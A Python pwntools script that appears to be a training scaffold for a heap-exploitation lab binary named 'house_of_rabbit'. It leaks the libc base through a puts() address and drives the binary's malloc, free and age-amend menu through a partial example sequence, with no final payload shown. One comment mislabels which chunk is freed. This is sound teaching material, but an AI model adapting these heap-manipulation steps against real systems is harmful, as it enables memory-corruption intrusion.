#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_rabbit")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc is broken again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

# Select the "amend age" option; send new value.
def amend_age(age):
    io.send("3")
    io.sendafter("age: ", f"{age}")
    io.recvuntil("> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Enter "age" value.
age = 33;

io.sendafter("age: ", f"{age}")
io.recvuntil("> ")

# Request 2 fast chunks.
fast_A = malloc(24, "A"*8)
fast_B = malloc(24, "B"*8)

# Request a large chunk.
large_chunk = malloc(0x1000, "C"*8)

# Free the large chunk.
free(fast_B)

# Amend the "age" value.
amend_age(96)

# =============================================================================

io.interactive()
